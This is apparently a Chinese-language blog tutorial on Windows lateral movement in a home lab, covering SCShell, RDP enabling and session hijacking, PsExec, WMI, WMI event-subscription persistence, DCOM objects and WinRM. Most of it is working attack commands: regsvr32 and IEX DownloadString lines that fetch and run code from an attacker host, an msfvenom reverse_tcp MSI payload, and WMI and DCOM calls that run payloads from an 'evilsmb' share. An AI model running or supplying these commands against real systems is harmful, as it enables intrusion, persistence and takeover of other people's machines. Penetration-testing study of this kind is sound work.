<h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><p><font color='red'>首先用msf生成payload</font></p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230202221003882.png"  ><span class="image-caption">image-20230202221003882</span></p>
<p>记得一定要设置payload为windows的，它默认是python的payload</p>
<p><font color='cornflowerblue'>然后远程加载</font></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SCShell</span>.exe <span class="hljs-number">192.168.232.135</span> XblAuthManager <span class="hljs-string">&quot;C:\Windows\System32\cmd.exe /c C:\Windows\System32\regsvr32 /s /n /u /i:http://192.168.232.129:8080/AusSXQGs.sct scrobj.dll&quot;</span> hack admin<br></code></pre></td></tr></table></figure>



<p>成功就会上线</p>
<p>但是测试失败</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230202221518477.png"  ><span class="image-caption">image-20230202221518477</span></p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">关闭了UAC还是失败<br></code></pre></td></tr></table></figure>







<h1 id="远程桌面利用"><a href="#远程桌面利用" class="headerlink" title="远程桌面利用"></a>远程桌面利用</h1><p>需要开启3389端口</p>
<h2 id="判断是否开启远程桌面"><a href="#判断是否开启远程桌面" class="headerlink" title="判断是否开启远程桌面"></a>判断是否开启远程桌面</h2><figure class="highlight stata"><table><tr><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">reg</span> <span class="hljs-keyword">query</span> <span class="hljs-string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections<br></code></pre></td></tr></table></figure>

<p>看结果，若为0，则表示RDP服务启动；若为1，则表示RDP服务禁用</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230203203306464.png"  ><span class="image-caption">image-20230203203306464</span></p>
<p>此结果表示禁用</p>
<p>本地开启远程桌面</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#开启远程桌面连接功能</span><br>reg <span class="hljs-built_in">add</span> <span class="hljs-string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections /t REG_DWORD /d 0 /f<br><br><span class="hljs-comment">#关闭“仅允许运行使用网络级别身份验证的远程桌面的计算机连接”（鉴权）</span><br>reg <span class="hljs-built_in">add</span> <span class="hljs-string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /v UserAuthentication /t REG_DWORD /d 0<br><br><span class="hljs-comment">#设置防火墙策略，放行3389端口</span><br>netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-built_in">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Remote Desktop&quot;</span> <span class="hljs-attribute">protocol</span>=TCP <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">localport</span>=3389 <span class="hljs-attribute">action</span>=allow<br></code></pre></td></tr></table></figure>



<p>开启远程主机的远程桌面连接功能</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">wmic /Node:<span class="hljs-number">192.168</span><span class="hljs-number">.232</span><span class="hljs-number">.135</span> /<span class="hljs-keyword">User</span>:Administrator /<span class="hljs-keyword">Password</span>:<span class="hljs-keyword">admin</span> RDTOGGLE <span class="hljs-keyword">WHERE</span> ServerName=<span class="hljs-string">&#x27;WIN2016-WEB3&#x27;</span> <span class="hljs-keyword">call</span> SetAllowTSConnections <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>





<h2 id="RDP-Hijacking-（远程桌面劫持）"><a href="#RDP-Hijacking-（远程桌面劫持）" class="headerlink" title="RDP Hijacking （远程桌面劫持）"></a>RDP Hijacking （远程桌面劫持）</h2><p>大致意思就是，在拥有system权限的前提下，能够不需要凭据，来进行任意的用户切换</p>
<p>即可以不需要密码，就可以登陆主机上拥有的账户</p>
<p>比如，现在我用账户A登陆，且拥有system的权限</p>
<p>寻找其他用户会话</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile">query <span class="hljs-keyword">user</span><br></code></pre></td></tr></table></figure>



<p>执行上面命令之后，后面是有ID的</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><code class="hljs applescript">tscon <span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure>

<p>这样就可以切换到其他会话</p>
<h2 id="SharpRDP"><a href="#SharpRDP" class="headerlink" title="SharpRDP"></a>SharpRDP</h2><p>这是一款开源的工具，其最大的优势在于，横向时，不用设置内网代理</p>
<p>将此工具上传到已经攻陷的主机，然后使用即可</p>
<p>地址</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/0xthirteen/</span>SharpRDP<br></code></pre></td></tr></table></figure>





<h1 id="PsExec"><a href="#PsExec" class="headerlink" title="PsExec"></a>PsExec</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>就是一款远程控制工具</p>
<h2 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h2><p>微软官方提供的工具，不怕杀软</p>
<p>具有命令行的交互性</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>利用SMB，连接到服务端的Admin$共享</p>
<p>然后释放名为psexesvc.exe的文件</p>
<p>注册名字为，PSEXESVC的服务</p>
<p>客户端执行命令时，服务端通过服务，来执行命令然后回显</p>
<p>运行结束之后，会自动删除生成的PSEXESVC服务</p>
<p><strong><font color='red'>简而言之，就是自己创建一个合法的服务，通过这个服务来执行命令</font></strong></p>
<h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>目标机开启Admin$共享</p>
<p>目标机关闭防火墙，或者放行445端口</p>
<h2 id="操作-2"><a href="#操作-2" class="headerlink" title="操作"></a>操作</h2><p>打开目标机的cmd</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">#普通用户<br>psexec<span class="hljs-selector-class">.exe</span> -accepteula \\<span class="hljs-number">192.168</span>.<span class="hljs-number">232.135</span> -u Administrator -<span class="hljs-selector-tag">p</span> admin -s cmd<span class="hljs-selector-class">.exe</span>     <br><br>#域用户<br>psexec<span class="hljs-selector-class">.exe</span> -accepteula \\<span class="hljs-number">192.168</span>.<span class="hljs-number">232.135</span> -u 域名\Administrator -<span class="hljs-selector-tag">p</span> admin -s cmd<span class="hljs-selector-class">.exe</span>    <br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230203222323477.png"  ><span class="image-caption">image-20230203222323477</span></p>
<p>impacket工具包和msf里面都有psexec这款工具</p>
<p>impacket</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim">psexec.<span class="hljs-keyword">py</span><br></code></pre></td></tr></table></figure>

<p>msf</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">exploit<span class="hljs-regexp">/windows/</span>smb/psexec<br></code></pre></td></tr></table></figure>







<h1 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h1><p>WMI是一项windows的核心管理技术</p>
<p>可以管理本地和远程计算机</p>
<p>远程传输会用到两个协议</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">分布式组件对象模型	DCOM<br>windows远程管理		WinRM<br></code></pre></td></tr></table></figure>



<p>横向移动时，一般会用到两个方法</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">通过调用WMI的类方法，进行远程执行<br><br>远程部署WMI事件订阅，在特定的事件发生时触发攻击<br></code></pre></td></tr></table></figure>



<p><strong><font color='red'>WMI攻击条件</font></strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">远程主机开启WMI，一般是默认开启<br><br>远程主机防火墙放行135端口，135端口是WMI的默认端口<br></code></pre></td></tr></table></figure>





<h2 id="常规利用方法"><a href="#常规利用方法" class="headerlink" title="常规利用方法"></a>常规利用方法</h2><p><strong><font color='red'>远程查询</font></strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查询进程信息</span><br>wmic /node:192.168.232.135 /user:Administrator /password:admin process list brief <br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230204105105725.png"  ><span class="image-caption">image-20230204105105725</span></p>
<p><strong><font color='cornflowerblue'>远程创建进程</font></strong></p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">#用cmd执行命令，把结果储存到C:\result.txt<br>wmic /node:<span class="hljs-number">192.168</span><span class="hljs-number">.232</span><span class="hljs-number">.135</span> /<span class="hljs-keyword">user</span>:administrator /<span class="hljs-keyword">password</span>:<span class="hljs-keyword">admin</span> process <span class="hljs-keyword">call</span> <span class="hljs-keyword">create</span> &quot;cmd.exe /c ipconfig &gt; C:\result.txt&quot;<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230204110805993.png"  ><span class="image-caption">image-20230204110805993</span></p>
<p><font color='red'>WMIC在调用cmd执行命令时，是没有回显的，所以需要写入文件里面</font></p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230204110844000.png"  ><span class="image-caption">image-20230204110844000</span></p>
<p><strong><font color='orange'>远程安装MSI文件</font></strong></p>
<p>把恶意的MSI文件放在，SMB服务器上，在跳板机上执行命令，远程执行安装MSI文件</p>
<p>生成MSI恶意文件</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.232.129 <span class="hljs-attribute">LPORT</span>=1111 -f msi  -o aaa.msi <br></code></pre></td></tr></table></figure>



<p>开启SMB匿名共享</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">python smbserver.py evilsmb <span class="hljs-regexp">/root/</span>share -smb2support<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230204113731756.png"  ><span class="image-caption">image-20230204113731756</span></p>
<p>跳板机执行远程安装，加载</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">wmic /node:<span class="hljs-number">192.168</span><span class="hljs-number">.232</span><span class="hljs-number">.135</span> /<span class="hljs-keyword">user</span>:administrator /<span class="hljs-keyword">password</span>:<span class="hljs-keyword">admin</span> product <span class="hljs-keyword">call</span> install PackageLocation=&quot;\\192.168.232.152\evilsmb\aaa.msi&quot;<br></code></pre></td></tr></table></figure>

<p>即可收到会话</p>
<h2 id="常见利用工具"><a href="#常见利用工具" class="headerlink" title="常见利用工具"></a>常见利用工具</h2><h3 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h3><p>执行有回显</p>
<p>属于impacket项目的一个工具</p>
<p>需要135和445端口，其中445端口开启的目的就是传输交互的信息</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> wmiexec.<span class="hljs-keyword">py</span> administrator:admin@<span class="hljs-number">192.168</span>.<span class="hljs-number">232.135</span><br><br><span class="hljs-keyword">python</span> wmiexec.<span class="hljs-keyword">py</span> <span class="hljs-symbol">&lt;domain&gt;</span>/<span class="hljs-symbol">&lt;username&gt;</span>:<span class="hljs-symbol">&lt;password&gt;</span>@<span class="hljs-symbol">&lt;ip&gt;</span><br></code></pre></td></tr></table></figure>

<p>用这个是需要安装impacket库的，但是这个库一直被防火墙拦截</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230204125300686.png"  ><span class="image-caption">image-20230204125300686</span></p>
<p>当然，如果跳板机没有python环境，也可以打包成exe文件</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><code class="hljs powershell">pip install pyinstaller<br><br><span class="hljs-built_in">cd</span> impacket\examples<br><br>pyinstaller <span class="hljs-operator">-F</span> wmiexec.py<br></code></pre></td></tr></table></figure>

<p>exe文件的用法和py一样</p>
<h3 id="Invoke-WmiCommand"><a href="#Invoke-WmiCommand" class="headerlink" title="Invoke-WmiCommand"></a>Invoke-WmiCommand</h3><p>Invoke-WmiCommand.ps1是powersploit的一个脚本</p>
<p>通过powershell来执行</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#远程加载Invoke-WmiCommand.psl脚本</span><br><span class="hljs-built_in">IEX</span>(<span class="hljs-built_in">New-Object</span> Net.Webclient).DownloadString(<span class="hljs-string">&#x27;http://IP地址:端口/Invoke-WmiCommand.ps1&#x27;</span>)<br><br><span class="hljs-comment">#指定远程系统用户</span><br><span class="hljs-variable">$User</span> = <span class="hljs-string">&quot;域名\用户名&quot;</span><br><br><span class="hljs-comment">#指定用户密码</span><br><span class="hljs-variable">$Password</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-literal">-String</span> <span class="hljs-string">&quot;密码&quot;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><br><span class="hljs-comment">#将用户名和密码整合，以便导入Credential</span><br><span class="hljs-variable">$Cred</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span> System.Management.Automation.PSCredential <span class="hljs-literal">-ArgumentList</span> <span class="hljs-variable">$User</span>,<span class="hljs-variable">$Password</span><br><br><span class="hljs-comment">#输入要执行的命令</span><br><span class="hljs-variable">$Remote</span> = <span class="hljs-built_in">Invoke-WmiCommand</span> <span class="hljs-literal">-Payload</span> &#123;ipconfig命令&#125; <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$Cred</span> <span class="hljs-literal">-ComputerName</span> <span class="hljs-string">&quot;192.168.232.135&quot;</span><br><br><span class="hljs-comment">#输出回显</span><br><span class="hljs-variable">$Remote</span>.PayloadOutput<br></code></pre></td></tr></table></figure>

<p>用python开启一个http服务，来远程加载Invoke-WmiCommand.ps1</p>
<p>测试无法成功</p>
<h2 id="WMI事件订阅的利用"><a href="#WMI事件订阅的利用" class="headerlink" title="WMI事件订阅的利用"></a>WMI事件订阅的利用</h2><p><font color='red'>主要用于权限维持，也可以用于横向</font></p>
<h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>WMI的事件处理功能及其强大，几乎可以对操作系统上发生的任何事情做出响应</p>
<p>WMI事件订阅主要包括两大板块：事件过滤器（event filter）、事件消费者（event consumer）</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">当创建一个进程时<br>通过WMI事件订阅来执行预先设置的特定脚本<br><br>触发事件的具体条件称为“事件过滤器”<br><br>对指定事件发生所作出的响应称为“事件消费者”<br></code></pre></td></tr></table></figure>



<p>所有的事件过滤器被存储在一个ROOT\subscription:_ _EventFilter对象的实例</p>
<p>通过创建_ _EventFilter对象实例来部署事件过滤器</p>
<p>事件消费者是基于ROOT\subscription:_ _EventConsumer系统派生来的类</p>
<p><font color='red'>部署事件订阅时，需要分别构建Filter和Consumer，并将二者绑在一起</font></p>
<p><font color='cornflowerblue'>使用该技术需要提供远程主机的管理员的用户凭据</font></p>
<h3 id="手动利用"><a href="#手动利用" class="headerlink" title="手动利用"></a>手动利用</h3><h3 id="Sharp-WMIEvent"><a href="#Sharp-WMIEvent" class="headerlink" title="Sharp-WMIEvent"></a>Sharp-WMIEvent</h3><p>这是利用写好的powershell脚本，比手工利用更加方便</p>
<p>首先搭建SMB共享服务，将攻击载荷上传在共享目录</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230206230317392.png"  ><span class="image-caption">image-20230206230317392</span></p>
<p>然后在跳板机执行如下命令</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">Sharp-WMIEvent -<span class="hljs-keyword">Trigger</span> <span class="hljs-type">Interval</span> -IntervalPeriod <span class="hljs-number">60</span> -ComputerName <span class="hljs-number">192.168</span><span class="hljs-number">.232</span><span class="hljs-number">.135</span> -<span class="hljs-keyword">Domain</span> aaa -<span class="hljs-keyword">User</span> Administrator -<span class="hljs-keyword">Password</span> <span class="hljs-keyword">admin</span> -Command &quot;cmd.exe / c \\192.168.232.152\evilsmb\hobbyhorse_x64.exe&quot;<br></code></pre></td></tr></table></figure>

<p>执行之后，在远程主机上会部署一个随机命名的永久事件订阅，并每隔60秒执行一次SMB共享中的载荷，使远程主机上线</p>
<h1 id="DCOM的利用"><a href="#DCOM的利用" class="headerlink" title="DCOM的利用"></a>DCOM的利用</h1><h2 id="COM和DCOM"><a href="#COM和DCOM" class="headerlink" title="COM和DCOM"></a>COM和DCOM</h2><p>com（组件对象模型）</p>
<p>com是微软的一套软件组件的二进制接口标准</p>
<p>实现跨编程语言的进程直接可以通信，可以创建动态对象</p>
<p>允许代码重用而无需编译</p>
<p>COM 中的组件是特定于平台的二进制文件，符合标准的应用程序和其他组件可以使用</p>
<p><font color='red'>使用组件服务的程序包含指向其标准化接口的指针，而不是访问组件的底层数据结构。因此，无论组件如何工作或使用何种语言编写，组件都可以相互通信</font></p>
<p>dcom（分布式组件对象模型）</p>
<p>dcom是com的扩展</p>
<p>dcom是基于com的一系列概念和程序接口</p>
<p>支持不同机器上的组件进行通信</p>
<p>可以是客户端程序对象能够请求来自网络中的另一台计算机上的服务器程序对象</p>
<p><font color='red'>可以允许应用程序实例化和访问远程计算机上的com对象</font></p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><code class="hljs avrasm">DCOM使用远程过程调用技术（RPC）将<span class="hljs-keyword">COM</span>的功能扩展到本地计算机之外<br></code></pre></td></tr></table></figure>



<p>综上能进行横向的就只能是DCOM</p>
<h2 id="DCOM横向移动"><a href="#DCOM横向移动" class="headerlink" title="DCOM横向移动"></a>DCOM横向移动</h2><p>不是说DCOM支持远程访问就能够进行横向</p>
<p>真正的是因为</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">部分的DCOM组件公开的接口，包含不安全的方法<br></code></pre></td></tr></table></figure>



<p>常用包含不安全方法的组件</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">MMC20.<span class="hljs-class">Application</span></span><br><br><span class="hljs-variable">Excel.<span class="hljs-class">Application</span></span><br><br><span class="hljs-variable">ShellWindows</span><br><br><span class="hljs-variable">ShellBrowserWindow</span><br></code></pre></td></tr></table></figure>



<p>查看计算机上所有的DCOM程序组件</p>
<figure class="highlight vbnet"><table><tr><td class="code"><pre><code class="hljs vbnet"><span class="hljs-keyword">Get</span>-CimInstance Win32_DCOMApplication<br><br><span class="hljs-keyword">Get</span>-WmiObject -<span class="hljs-keyword">Namespace</span> ROOT\CIMV2 -<span class="hljs-keyword">Class</span> Win32_DCOMApplication <br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230207115402041.png"  ><span class="image-caption">image-20230207115402041</span></p>
<p>条件</p>
<p>从上面的命令可以看出，DCOM组件的横向利用，是需要powershell的</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">拥有管理器权限的powershell<br><br>未开启防火墙<br></code></pre></td></tr></table></figure>





<h3 id="MMC20-Application"><a href="#MMC20-Application" class="headerlink" title="MMC20.Application"></a>MMC20.Application</h3><p>MMC20.Application对象的Document.ActiveView下存在一个ExecuteShellCommand方法</p>
<p>可以用来启动子进程并运行执行的程序或系统命令</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><code class="hljs isbl">原理就是<span class="hljs-variable">MMC20.<span class="hljs-class">Application</span></span>会启动一个进程<span class="hljs-variable">aaa.exe</span><br><br><span class="hljs-variable">ExecuteShellCommand</span>可以在进程中创建子进程，子进程就可以是我们的攻击载荷<br></code></pre></td></tr></table></figure>

<p><font color='red'>适用于win7及其以上版本</font></p>
<p>首先搭建SMB匿名共享，然后放入后门文件</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">python smbserver.py evilsmb <span class="hljs-regexp">/root/</span>share -smb2support <br></code></pre></td></tr></table></figure>



<p>现在需要对方主机的管理员权限的powershell</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">runas <span class="hljs-regexp">/netonly /u</span>ser:aaa\administrator powershell<br><br>a<span class="hljs-string">&#x27;a&#x27;</span>a：对方主机电脑名 （可省略）<br>administrator：管理员组的用户的用户名<br></code></pre></td></tr></table></figure>

<p>输入之后需要对方管理员的凭据</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230207142522182.png"  ><span class="image-caption">image-20230207142522182</span></p>
<p>然后执行如下命令</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">#通过ProgID与DCOM进行远程交互<br><span class="hljs-variable">$com</span> = <span class="hljs-selector-attr">[activator]</span>::<span class="hljs-built_in">CreateInstance</span>(<span class="hljs-selector-attr">[type]</span>::<span class="hljs-built_in">GetTypeFromProgID</span>(<span class="hljs-string">&quot;MMC20.Application&quot;</span>,<span class="hljs-string">&quot;192.168.232.136&quot;</span>))<br><br>#调用ExecuteShellCommand方法启动进程，运行攻击载荷<br><span class="hljs-variable">$com</span><span class="hljs-selector-class">.Document</span><span class="hljs-selector-class">.ActiveView</span><span class="hljs-selector-class">.ExecuteShellCommand</span>(<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-variable">$null</span>,<span class="hljs-string">&quot;/c\\192.168.232.152\evilsmb\hobbyhorse_x64.exe&quot;</span>, <span class="hljs-string">&quot;minimized&quot;</span>)<br></code></pre></td></tr></table></figure>







<h3 id="ShellWindows"><a href="#ShellWindows" class="headerlink" title="ShellWindows"></a>ShellWindows</h3><p>shellwindows这个组件提供了Document.Application.ShellExecute方法</p>
<p>可以启动指定的子进程来运行指定的程序或系统命令</p>
<p>ShellWindows对象没有ProgID，需要使用CLSID来创建实例</p>
<p>需要使用OleViewDotNet来找到CLSID</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">9BA05972</span>-F6A8-<span class="hljs-number">11</span>CF-A442-<span class="hljs-number">00</span>A0C90A8F39<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230207194006281.png"  ><span class="image-caption">image-20230207194006281</span></p>
<p>和MMC20.Application差不多，也是需要对方的管理员权限的powershell</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">runas <span class="hljs-regexp">/netonly /u</span>ser:aaa\administrator powershell<br><br>aaa：对方主机电脑名 （可省略）<br>administrator：管理员组的用户的用户名<br></code></pre></td></tr></table></figure>



<p>然后弹出拥有对方管理员权限的powershell</p>
<p>然后</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">#建立远程交互<br><span class="hljs-variable">$com</span> = <span class="hljs-selector-attr">[Activator]</span>::<span class="hljs-built_in">CreateInstance</span>(<span class="hljs-selector-attr">[Type]</span>::<span class="hljs-built_in">GetTypeFromCLSID</span>(<span class="hljs-string">&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;</span>, <span class="hljs-string">&quot;192.168.232.137&quot;</span>))<br><br>#调用shellexecute方法启动子进程，远程开启计算机程序<br><span class="hljs-variable">$com</span><span class="hljs-selector-class">.Item</span>()<span class="hljs-selector-class">.Document</span><span class="hljs-selector-class">.Application</span><span class="hljs-selector-class">.ShellExecute</span>(<span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/c calc.exe&quot;</span>, <span class="hljs-string">&quot;C:\Windows\System32&quot;</span>, <span class="hljs-variable">$null</span>,<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230207202751398.png"  ><span class="image-caption">image-20230207202751398</span></p>
<p>也可以通过SMB服务，进行远程执行恶意文件</p>
<p>修改这一项即可</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230207202909382.png"  ><span class="image-caption">image-20230207202909382</span></p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus"><span class="hljs-variable">$com</span><span class="hljs-selector-class">.Item</span>()<span class="hljs-selector-class">.Document</span><span class="hljs-selector-class">.Application</span><span class="hljs-selector-class">.ShellExecute</span>(<span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/c \\192.168.232.152\evilsmb\hobbyhorse_x64.exe&quot;</span>, <span class="hljs-string">&quot;C:\Windows\System32&quot;</span>, <span class="hljs-variable">$null</span>,<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230207202953150.png"  ><span class="image-caption">image-20230207202953150</span></p>
<p><font color='red'>总结</font></p>
<p>不同与MMC20.Application的是，ShellWindows并不会创建新进程，而是在已有的explorer.exe进程中创建并且执行子进程</p>
<h3 id="ShellBrowserWindow"><a href="#ShellBrowserWindow" class="headerlink" title="ShellBrowserWindow"></a>ShellBrowserWindow</h3><p>同ShellWindows一样，也是调用Document.Application.ShellExecute方法，在explorer.exe进程下创建子进程</p>
<p>不同的是</p>
<p><strong><font color='red'>它只适用于windows 10和windows server 2012</font></strong></p>
<h1 id="WinRM的利用"><a href="#WinRM的利用" class="headerlink" title="WinRM的利用"></a>WinRM的利用</h1><h2 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h2><p>WinRM是通过一个叫WS-Management协议，来实现远程管理的</p>
<p>WS-Management协议</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">用来进行远程软硬件管理的web服务协议<br><br>在同一个网络内，允许两台计算机相互通信<br><br>对应5985端口<br></code></pre></td></tr></table></figure>

<p>只要启动了服务，防火墙就会放行对应的端口，不会阻拦</p>
<p><font color='red'>在windows server 2008以上WinRM是默认开启的</font></p>
<p><font color='red'>Win7系统中却默认安装此WinRM服务，但是默认为禁用状态，Win8系统和Win10系统也都默认关闭WinRM服务</font></p>
<p>需要管理员的凭据</p>
<h2 id="通过WinRM执行远程命令"><a href="#通过WinRM执行远程命令" class="headerlink" title="通过WinRM执行远程命令"></a>通过WinRM执行远程命令</h2><p>要用到两个工具winrs、winrm</p>
<p><font color='red'>在首次用到这两个工具时，需要设置信任</font></p>
<p>将目标ip设置为信任ip，添加到信任列表</p>
<p><font color='red'>设置信任列表的前提是需要把跳板机网络连接改为专用网络，否则无法开启</font>（这一点在本地测试时要注意，但是在实际的环境中，一般都是域，无需过多注意）</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#打开WinRM服务</span><br>winrm quickconfig -q<br><br><span class="hljs-comment">#cmd设置</span><br>winrm <span class="hljs-built_in">set</span> winrm/config<span class="hljs-built_in">/client </span>@&#123;<span class="hljs-attribute">TrustedHosts</span>=<span class="hljs-string">&quot;ip地址&quot;</span>&#125;<br><br><span class="hljs-comment">#powershell设置</span><br>Set-Item WSMan:localhost\client\trustedhosts -value *<br><br>其中IP地址可以设置为*，表示信任任何ip<br></code></pre></td></tr></table></figure>



<h3 id="winrs"><a href="#winrs" class="headerlink" title="winrs"></a>winrs</h3><p>winrs是WinRM提供的客户端程序，在双方都开启WinRM服务的前提下，可以远程执行命令</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">winrs -r:http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">232.137</span>:<span class="hljs-number">5985</span> -u:administrator -p:admin <span class="hljs-string">&quot;whoami&quot;</span><br><br><span class="hljs-comment">#也可以运行cmd</span><br>winrs -r:http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">232.137</span>:<span class="hljs-number">5985</span> -u:administrator -p:admin <span class="hljs-string">&quot;cmd&quot;</span><br></code></pre></td></tr></table></figure>

<p>微软官方给出的建议</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>learn.microsoft.com<span class="hljs-regexp">/zh-cn/</span>troubleshoot<span class="hljs-regexp">/windows-client/</span>system-management-components/errors-when-you-run-winrm-commands<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230207231306921.png"  ><span class="image-caption">image-20230207231306921</span></p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230208190054019.png"  ><span class="image-caption">image-20230208190054019</span></p>
<h3 id="winrm-cmd"><a href="#winrm-cmd" class="headerlink" title="winrm.cmd"></a>winrm.cmd</h3><p>winrm.cmd运行WMI对象通过WinRM传输进行远程交互，在本地或者远程计算机上枚举WMI对象实例或调用WMI类方法</p>
<p>调用WMI的win32_process类中的create方法来创建进程</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><code class="hljs smali">winrm<span class="hljs-built_in"> invoke </span>Create wmicimv2/Win32_Process @&#123;CommandLine=<span class="hljs-string">&quot;calc.exe&quot;</span>&#125; -r:http://192.168.8.1:5985 -u:administrator -p:ADMIN!@<span class="hljs-comment">#45</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230208191821182.png"  ><span class="image-caption">image-20230208191821182</span></p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230208191918882.png"  ><span class="image-caption">image-20230208191918882</span></p>
